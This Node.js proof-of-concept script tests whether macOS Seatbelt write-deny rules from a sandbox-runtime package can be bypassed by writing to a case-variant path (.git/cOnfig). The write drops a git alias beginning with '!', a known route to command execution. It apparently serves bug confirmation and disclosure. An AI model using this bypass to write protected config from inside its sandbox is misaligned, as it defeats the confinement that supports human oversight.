#!/usr/bin/env node
// Settles the one macOS-only question for the case-insensitive write-deny bypass:
//
//   Does live Seatbelt match (deny file-write* (regex "^(.*/)?\.git/config$"))
//   against the LITERAL syscall path (.git/cOnfig -> BYPASS) or against the
//   case-folded on-disk name (.git/config -> still blocked)?
//
// It imports the ACTUAL shipped sandbox-runtime profile generator (no rewrite)
// and runs the ACTUAL /usr/bin/sandbox-exec. Run on macOS (default APFS).
//
// Usage:
//   npm i @anthropic-ai/sandbox-runtime@0.0.52
//   node run-seatbelt-case-test.mjs
//
// PASS (bug confirmed) = canonical write DENIED, case-variant write ALLOWED.

import { execSync } from "node:child_process";
import { mkdtempSync, rmSync, existsSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);

// Resolve the installed package's real macOS profile generator.
let wrapCommandWithSandboxMacOS;
for (const sub of [
  "@anthropic-ai/sandbox-runtime/dist/sandbox/macos-sandbox-utils.js",
  "@anthropic-ai/sandbox-runtime/dist/index.js",
]) {
  try {
    const mod = await import(require.resolve(sub));
    wrapCommandWithSandboxMacOS =
      mod.wrapCommandWithSandboxMacOS ?? wrapCommandWithSandboxMacOS;
  } catch {}
}
if (!wrapCommandWithSandboxMacOS) {
  console.error("Could not import wrapCommandWithSandboxMacOS from the installed package.");
  console.error("Run: npm i @anthropic-ai/sandbox-runtime@0.0.52  (then re-run)");
  process.exit(2);
}

const work = mkdtempSync(join(tmpdir(), "sbx-case-"));
mkdirSync(join(work, ".git"), { recursive: true });
process.chdir(work);
console.log("workdir:", work, "(APFS case-insensitive expected)\n");

// Build a real write-restricted profile: only this dir is write-allowed,
// default mandatory denies (which include .git/config, .git/hooks, dotfiles).
function wrappedFor(innerCmd) {
  return wrapCommandWithSandboxMacOS({
    command: innerCmd,
    needsNetworkRestriction: false,
    writeConfig: { allowOnly: [work] },
    readConfig: undefined,
    allowGitConfig: false,
  });
}

function probe(label, targetRelPath) {
  const marker = `WROTE_${label}`;
  // Try to write through the sandbox; report whether the file landed.
  const inner = `printf '[alias]\\n\\tpwn = !echo ${marker}\\n' > ${targetRelPath} && echo OK_WRITE || echo DENIED_WRITE`;
  let out = "";
  try {
    out = execSync(wrappedFor(inner), { shell: "/bin/bash", encoding: "utf8" }).trim();
  } catch (e) {
    out = `DENIED_WRITE (exec error: ${(e.stderr || e.message || "").toString().trim()})`;
  }
  const landed = existsSync(join(work, ".git", "config")) || existsSync(join(work, targetRelPath.replace(/^\.\//, "")));
  console.log(`[${label}] target=${targetRelPath}`);
  console.log(`   sandbox said: ${out}`);
  console.log(`   file present after: ${landed}\n`);
  // reset
  try { rmSync(join(work, ".git", "config"), { force: true }); } catch {}
  return /OK_WRITE/.test(out) && landed;
}

console.log("=== Probe 1: canonical .git/config  (EXPECT: denied) ===");
const canonical = probe("canonical", ".git/config");

console.log("=== Probe 2: case-variant .git/cOnfig  (the bypass under test) ===");
const variant = probe("variant", ".git/cOnfig");

console.log("──────────────────────────────────────────────");
if (!canonical && variant) {
  console.log("RESULT: BYPASS CONFIRMED ✅  canonical DENIED, case-variant ALLOWED.");
  console.log("=> Seatbelt matches the literal path; the case-insensitive deny gap is real.");
  process.exit(0);
} else if (!canonical && !variant) {
  console.log("RESULT: NOT vulnerable here — Seatbelt also blocked the case-variant.");
  console.log("=> Seatbelt appears to case-fold/canonicalize before matching. Bug does NOT hold.");
  process.exit(1);
} else {
  console.log(`RESULT: INCONCLUSIVE (canonical allowed=${canonical}, variant allowed=${variant}).`);
  console.log("=> Check that write restrictions actually engaged and FS is case-insensitive.");
  process.exit(3);
}
